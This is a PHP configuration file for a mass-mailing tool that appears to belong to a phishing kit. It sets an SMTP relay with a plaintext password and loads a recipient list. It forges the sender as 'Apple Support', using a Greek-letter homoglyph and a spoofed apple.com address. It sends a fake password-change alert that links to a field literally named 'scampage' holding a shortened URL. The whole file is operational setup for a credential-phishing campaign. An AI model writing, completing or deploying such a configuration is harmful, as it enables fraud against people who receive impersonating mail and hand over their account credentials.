<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "5@hotmessage.info",
        "password" => "poiu0987"
    ],
];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 3,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/deathHot.txt",
    "fromname"       => "Aρρle Support",
    "frommail"       => "noreply-##randstring##@apple.com",
    "subject"        => "RE: [ Alert ] [ Summary News Report ] Confirmation change password of your Apple account",
    "msgfile"        => "file/letter/1.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://htl.li/UEbg30kIloO"],
];
